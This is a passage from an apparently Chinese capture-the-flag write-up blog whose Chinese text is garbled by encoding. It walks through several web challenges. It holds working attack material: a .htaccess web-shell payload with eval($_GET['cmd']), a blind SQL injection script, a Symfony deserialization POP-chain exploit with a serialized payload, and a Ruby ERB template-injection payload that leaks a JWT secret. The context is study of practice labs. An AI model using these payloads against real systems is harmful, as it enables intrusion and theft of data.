class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªunlinkå¯¹å†™å…¥çš„æ–‡ä»¶è¿‡æ»¤çš„å¾ˆä¸¥ï¼Œè¿™é‡Œçš„æ­£åˆ™åªå…è®¸a-z.çš„æ–‡ä»¶åï¼Œä¹Ÿå°±æ˜¯è¯´é¢˜ç›®åŒ…å«çš„f13g.phpæ²¡æœ‰åŠæ³•ç›´æ¥åŒ…å«ã€‚åœ¨è‡ªå·±å†™å…¥çš„æ–‡ä»¶å†…å®¹æœ€åé¢ä¼šè¢«æ‹¼å…¥ä¸€å¥è¯ï¼Œæš‚æ—¶ä¸çŸ¥é“ä¼šæœ‰å•¥å½±å“ã€‚</p>
<p>è€ƒè™‘äº†å¾ˆä¹…ä¸çŸ¥é“è€ƒç‚¹åœ¨å“ªé‡Œï¼Œç´¢æ€§å»çœ‹wpäº†ï¼Œæ‰¾åˆ°äº†å‡ºé¢˜å¸ˆå‚…çš„ç¬”è®°ï¼Œå“¦è±ï¼ŒåŸæ¥è€ƒçš„æ˜¯.htaccess,ç›´æ¥ä¸Šä¼ .htaccessæ–‡ä»¶ä¼š500ï¼Œå°±æ˜¯é‚£æœ€åé¢é‚£å¥è¯çš„åŸå› </p>
<p>éé¢„æœŸè§£ï¼š</p>
<p>åæ–œæ å…·æœ‰æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œçš„åŠŸèƒ½ï¼Œè¿™é‡Œå¯ä»¥ç”¨\ç›´æ¥ç»•è¿‡stristrç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤</p>
<p>expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le <span class="string">".htaccess"</span></span><br><span class="line"><span class="comment">#&lt;?php @eval($_GET['cmd']); ?&gt;\</span></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œurlç¼–ç åå†ä¸Šä¼ ï¼Œurlé‡Œå°±èƒ½ç›´æ¥getshelläº†</p>
<img src="/2020/06/26/taoismf/1.png" class="">

<p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸Šä¼ ä¸€æ¬¡æ–‡ä»¶åªèƒ½æ‰“ä¸€æ¬¡</p>
<img src="/2020/06/26/taoismf/2.png" class="">

<p>æˆåŠŸæ‹¿åˆ°flagï¼Œçœ‹äº†é¢„æœŸè§£ï¼Œæ­¥éª¤ç¹çäº›ï¼Œä¸‹æ¬¡å†æ•´ç†å§</p>
<h3 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h3><p>ç™»å½•æ³¨å†Œï¼Œæ³¨å†Œæœªå¼€æ”¾ï¼Œç™»å½•æŒ‰é’®æ²¡æœ‰å›æ˜¾ï¼ŒæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°æ˜¯jsonæ ¼å¼å‘é€çš„æ•°æ®ï¼Œæµ‹è¯•å‘ç°å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œä¸Šç›²æ³¨è„šæœ¬è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#é¢˜ç›®åœ°å€</span></span><br><span class="line">    url = <span class="string">"http://0ffb111f-d463-4cec-b100-341cc8a28d4b.node3.buuoj.cn/index.php?r=Login/Index"</span></span><br><span class="line">    <span class="comment">#æ³¨å…¥payload</span></span><br><span class="line">    payloads = <span class="string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#æŸ¥è¯¢payload</span></span><br><span class="line">        payload = <span class="string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span></span><br><span class="line">            datas = &#123;<span class="string">'username'</span>:payloads.format(str_to_hex(payload.format(i,j))),<span class="string">'password'</span>:<span class="string">'test213'</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬æ˜¯åˆ«çš„å¸ˆå‚…çš„ï¼Œæˆ‘æœ¬åœ°è·‘ä¸å‡ºæ¥ï¼Œå«–äº†ç»“æœï¼šglzjin_wants_a_girl_friend.zipï¼Œå¯ä»¥ä¸‹è½½</p>
<img src="/2020/06/26/taoismf/3.png" class="">

<p>é€ä¸€æŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†ç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * åŠ è½½è§†å›¾æ–‡ä»¶</span></span><br><span class="line"><span class="comment">	 * viewName è§†å›¾åç§°</span></span><br><span class="line"><span class="comment">	 * viewData è§†å›¾åˆ†é…æ•°æ®</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> $viewPath;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadView</span><span class="params">($viewName =<span class="string">''</span>, $viewData = [])</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">"/View/&#123;$viewName&#125;.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract($viewData);</span><br><span class="line">			<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œå¹¶ä¸”åŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ§åˆ¶äº†$viewDataï¼Œåº”è¯¥å°±èƒ½è¯»å–æƒ³è¦çš„ï¼Œæ‰¾ä¸€ä¸‹ç”¨äº†loadViewï¼ˆï¼‰çš„æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* ç”¨æˆ·æ§åˆ¶å™¨</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">// è®¿é—®åˆ—è¡¨</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionList</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$params = $_REQUEST;</span><br><span class="line">		$userModel = <span class="keyword">new</span> UserModel();</span><br><span class="line">		$listData = $userModel-&gt;getPageList($params);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;loadView(<span class="string">'userList'</span>, $listData );</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $listData = $_REQUEST;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨UserController.phpæ–‡ä»¶é‡Œï¼ŒactionIndex()æ–¹æ³•ä¸­ï¼Œ$listDataæ˜¯é€šè¿‡$_REQUESTæ–¹æ³•è·å–çš„</p>
<img src="/2020/06/26/taoismf/4.png" class="">

<p>è¯»å–$img_fileçš„å†…å®¹ï¼Œç„¶åä»¥base64çš„å½¢å¼è¾“å‡ºå›¾ç‰‡</p>
<p>imgfileå¯é€šè¿‡extract(viewData)å˜é‡è¦†ç›–æ¼æ´å®Œå…¨æ§åˆ¶ï¼Œè€Œ$viewDataæ˜¯å—ç”¨æˆ·æ§åˆ¶çš„å®Œå…¨æ§åˆ¶çš„ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p>
<p>é€šè¿‡ä¸Šé¢çš„æ€è·¯ï¼Œè®¿é—®:index.php?r=User/Index&amp;img_file=/â€¦/flag.phpå¯ç›´æ¥è·å–flag.phpç»base64åçš„å†…å®¹</p>
<img src="/2020/06/26/taoismf/5.png" class="">

<p>base64è§£å¯†å°±èƒ½æ‹¿åˆ°flagäº†</p>
<h3 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1"><a href="#CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1"></a>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h3><p>è¿™é“é¢˜ç›®æ¶‰åŠåˆ°æ¥å£ï¼Œå‘½åç©ºé—´ä¹‹ç±»çš„ï¼ŒèŠ±äº†ä¸€ä¸ªä¸‹åˆçœ‹åˆ«çš„å¸ˆå‚…çš„wpï¼Œå¤ç°äº†ä¸€ä¸‹<del>~</del></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºï¼Œä¸‹è½½å‹ç¼©åŒ…ï¼Œæ‹¿åˆ°æºç ï¼Œååºåˆ—åŒ–</p>
<p>é¡¹ç›®æœç´¢__destruct()æ–¹æ³•ï¼Œæ‰¾åˆ°äº†vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\TagAwareAdapter.php</p>
<p>è°ƒç”¨äº†$this-&gt;commit()ï¼Œæ¥ç€è°ƒç”¨äº†$this-&gt;invalidateTags([])ï¼Œè·Ÿè¿›invalidateTags([])æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ok = <span class="keyword">true</span>;</span><br><span class="line">    $tagsByKey = [];</span><br><span class="line">    $invalidatedTags = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">        CacheItem::validateKey($tag);</span><br><span class="line">        $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">         <span class="comment">#åˆ¤æ–­$this-&gt;deferredæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">        <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">            <span class="comment">#é”®å€¼åˆ†ç¦»</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                $ok = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">        $tagsByKey = $f($items);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;poolå¯æ§ï¼Œè·Ÿè¿›saveDeferred()æ–¹æ³•ï¼ŒåŒæ—¶ï¼Œåœ¨æœ¬ç±»ä¸­__construct()æ–¹æ³•ä¸­å¯ä»¥çœ‹åˆ°$this-&gt;poolè¦æ±‚æ¥å£æ˜¯AdapterInterfaceï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸ªAdapterinterfaceæ¥å£å¹¶ä¸”å­˜åœ¨saveDferredæ–¹æ³•çš„ç±»</p>
<img src="/2020/06/26/taoismf/6.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢CacheItemInterfaceæ¥å£ï¼Œæ¡ä»¶æ»¡è¶³ç»§ç»­æ‰§è¡Œï¼Œè·Ÿè¿›ä¸€ä¸‹intialize()æ–¹æ³•</p>
<img src="/2020/06/26/taoismf/7.png" class="">

<p>è¿™é‡Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¹¶è¿›è¡Œäº†æ–‡ä»¶åŒ…å«</p>
<p>ç”±äºè¿™é¢˜æ¶‰åŠåˆ°å‘½åç©ºé—´çš„ä¸œè¥¿ï¼Œå¹¶ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œpopé“¾æ˜¯çœ‹çš„guokeå¸ˆå‚…çš„å†™çš„</p>
<p>è¿™é‡Œç»™å‡ºexp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'xxx'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$a=<span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<h3 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h3><img src="/2020/06/26/taoismf/8.png" class="">

<p>workå¯ä»¥è·å¾—é’±ï¼Œä½†æ˜¯è¿™ä¸ªé’±æ˜¯éšæœºçš„ï¼Œä¸å¯èƒ½çœŸçš„ä¸€ç›´ç‚¹åˆ°flagçš„ä»·æ ¼</p>
<p>çœ‹äº†æºç ï¼Œå¥½åƒä¸æ˜¯ç”¨å‰ç«¯jsæ¥åš</p>
<p>å°è¯•çœ‹çœ‹æœ‰æ²¡æœ‰éšè—çš„ä¿¡æ¯ï¼Œrobots.txtæœ‰éšè—ä¿¡æ¯ï¼Œè®¿é—®ï¼Œæ‹¿åˆ°äº†æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">require <span class="string">'sinatra'</span></span><br><span class="line">require <span class="string">'sinatra/cookies'</span></span><br><span class="line">require <span class="string">'sinatra/json'</span></span><br><span class="line">require <span class="string">'jwt'</span></span><br><span class="line">require <span class="string">'securerandom'</span></span><br><span class="line">require <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> do</span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;uid: auth[<span class="number">0</span>][<span class="string">"uid"</span>],jkl: auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  <span class="keyword">if</span> params[:do] == <span class="string">"#&#123;params[:name][0,7]&#125; is working"</span> then</span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line">post <span class="string">"/shop"</span> do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[<span class="string">"SECRET"</span>] , true, &#123; algorithm: <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: <span class="string">"error"</span>,message: <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: <span class="string">"success"</span>,message: <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>åŒ…å«äº†jwtï¼Œåº”è¯¥å’ŒjwtåŠ å¯†æœ‰å…³ï¼Œæ ¸å¿ƒä»£ç éƒ¨åˆ†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> params[:<span class="keyword">do</span>] == <span class="string">"#&#123;params[:name][0,7]&#125; is working"</span> then</span><br><span class="line"></span><br><span class="line">   auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">   cookies[:auth] = auth</span><br><span class="line">   ERB::new(<span class="string">"&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line"> end</span><br></pre></td></tr></table></figure>

<p>æŸ¥èµ„æ–™ï¼Œå¥½åƒæœ‰Ruby/ERBæ¨¡æ¿æ³¨å…¥ï¼Œè¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥ç”¨rubyçš„é¢„å®šä¹‰å­—ç¬¦$å¯¹åŒ¹é…çš„å­—ç¬¦ä¸²è¿›è¡Œè¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payloadï¼š?SERECT&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br></pre></td></tr></table></figure>

<img src="/2020/06/26/taoismf/9.png" class="">

<p>æˆåŠŸæ‹¿åˆ°äº†jwtåŠ å¯†çš„å¯†é’¥</p>
<p>buy flagæŠ“åŒ…ï¼Œè¿›è¡Œcookieçš„æ›¿æ¢ï¼Œcookieçš„ç”Ÿæˆé€šè¿‡jwtåœ¨çº¿åŠ å¯†</p>
<img src="/2020/06/26/taoismf/10.png" class="">

<p>æ›¿æ¢ä¹‹åï¼Œåœ¨è¿”å›åŒ…ä¸­æœ‰æ–°çš„cookieï¼Œæ”¾åˆ°ç½‘ç«™é‡Œè§£å¯†å³å¯</p>
<h3 id="GYCTF2020-EasyThinkingPhp"><a href="#GYCTF2020-EasyThinkingPhp" class="headerlink" title="[GYCTF2020]EasyThinkingPhp"></a>[GYCTF2020]EasyThinkingPhp</h3><p>æ ¹æ®é¢˜ç›®åï¼Œæ¨æµ‹æ˜¯thinkphpçš„ç‰ˆæœ¬æ¼æ´ï¼Œéšä¾¿è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œçˆ†å‡ºthinkphpçš„ç‰ˆæœ¬å·</p>
<img src="/2020/06/26/taoismf/11.png" class="">

<p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•çš„æ—¶å€™æŠ“ä¸€ä¸‹åŒ…ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªsession</p>
<p>æ‰¾ä¸€ä¸‹æœ‰å…³thinkphp6.0.0çš„ç‰ˆæœ¬æ¼æ´ï¼Œæ‰¾åˆ°äº†åœ¨sessionå¯ç”¨çš„æ¡ä»¶ä¸‹åˆ›å»ºä»»æ„æ–‡ä»¶å’Œåˆ é™¤ä»»æ„æ–‡ä»¶çš„æ–‡ç« ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»æ„æ–‡ä»¶æ„å‘³ç€å°±èƒ½å†™å…¥shellï¼Œå°±èƒ½getshellï¼Œåœ¨setId()çš„æ–¹æ³•ä¸­åªå¯¹sessionçš„é•¿åº¦è¿›è¡Œäº†åˆ¤æ–­ï¼Œåªè¦ç¬¦åˆ32ä½å°±èƒ½å¤Ÿè¢«æˆåŠŸå†™å…¥session</p>
